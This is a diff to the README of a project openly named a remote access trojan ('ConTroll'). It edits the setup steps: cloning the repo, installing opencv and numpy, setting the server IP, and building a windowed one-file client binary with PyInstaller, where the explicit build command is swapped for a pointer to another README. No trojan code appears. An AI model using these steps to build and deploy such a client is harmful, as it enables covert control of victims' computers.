@@ -34,11 +34,6 @@ Clone the repo
 git clone https://github.com/Lithium95/ConTroll_Remote_Access_Trojan.git
 ```
 
-Navigate to pyinstaller folder and install pyinstaller
-```
-python setup.py install
-```
-
 Install opencv and numpy from requirements.txt
 ```
 python -m pip install -r requirements.txt
@@ -52,9 +47,7 @@ http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/
 Set ip_address. The ip_address is taken from the server's network
 
 Use pyinstaller to build the client binary
-```
-python pyinstaller.py --onefile --windowed --icon=icon.ico client.pyw
-```
+* SEE PYINSTALLER README 
 
 4. Run the server
 ```
